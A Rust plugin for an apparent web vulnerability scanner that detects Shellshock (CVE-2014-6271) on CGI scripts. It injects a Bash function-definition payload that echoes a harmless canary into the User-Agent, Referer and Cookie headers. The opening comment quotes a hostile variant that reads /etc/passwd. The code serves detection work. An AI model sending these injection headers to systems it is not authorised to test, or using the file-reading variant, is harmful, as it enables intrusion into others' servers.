//! Shellshock (CVE-2014-6271) probe.
//!
//! Sends a `User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd`-style
//! header against each CGI path we know about, plus `/cgi-bin/test`,
//! `/cgi-bin/status`, and `/cgi-bin/printenv`. If the response body contains
//! the canary string, the server is vulnerable.

use async_trait::async_trait;
use corvex_core::error::Result;
use corvex_core::http::request::Request;
use corvex_core::plugin::{HookKind, Plugin, PluginInfo};
use corvex_core::report::{ReportItem, Severity};
use corvex_core::scan::ScanCtx;
use corvex_core::target::Mark;
use std::sync::Arc;
use tokio::sync::Mutex;

static INFO: PluginInfo = PluginInfo {
    name: "shellshock",
    full_name: "Shellshock",
    description: "CVE-2014-6271 Bash ShellShock detection on CGI scripts.",
    weight: 70,
    default: true,
    extra: false,
    hooks: &[HookKind::Scan],
};

const CANARY: &str = "CORVEX-SHELLSHOCK-DETECTED";

#[derive(Default)]
pub struct ShellshockPlugin;

fn payload() -> String {
    // `echo` + canary — no sensitive data retrieval, just a marker.
    format!("() {{ :; }}; echo Content-Type:text/plain; echo; echo {CANARY}")
}

fn candidate_uris() -> Vec<&'static str> {
    vec![
        "/cgi-bin/test-cgi",
        "/cgi-bin/status",
        "/cgi-bin/printenv",
        "/cgi-bin/test.cgi",
        "/cgi-bin/test.sh",
        "/cgi-bin/hello.cgi",
        "/cgi-bin/hello.sh",
    ]
}

#[async_trait]
impl Plugin for ShellshockPlugin {
    fn info(&self) -> &'static PluginInfo {
        &INFO
    }

    async fn on_scan(&self, ctx: &ScanCtx, mark: Arc<Mutex<Mark>>) -> Result<()> {
        let p = payload();
        let mut findings = Vec::new();
        for uri in candidate_uris() {
            let mut req = {
                let m = mark.lock().await;
                let mut r = Request::new(&m.hostname, m.port, "GET", uri);
                r.set_header("User-Agent", &p);
                r.set_header("Referer", &p);
                r.set_header("Cookie", &p);
                r
            };
            let resp = match ctx.nfetch(mark.clone(), &mut req).await {
                Ok(r) => r,
                Err(_) => continue,
            };
            if resp.body_str().contains(CANARY) {
                findings.push(ReportItem {
                    corvex_id: "SHELLSHOCK".into(),
                    method: "GET".into(),
                    uri: uri.into(),
                    message: "Shellshock (CVE-2014-6271) — the CGI executed the injected Bash payload.".into(),
                    refs: "CVE-2014-6271".into(),
                    data: String::new(),
                    plugin: INFO.name.to_string(),
                    severity: Severity::Critical,
                    cve: Some("CVE-2014-6271".into()),
                    cvss: Some(10.0),
                    ..Default::default()
                });
                break; // one hit is enough
            }
        }
        if !findings.is_empty() {
            ctx.emit(mark, findings).await;
        }
        Ok(())
    }
}
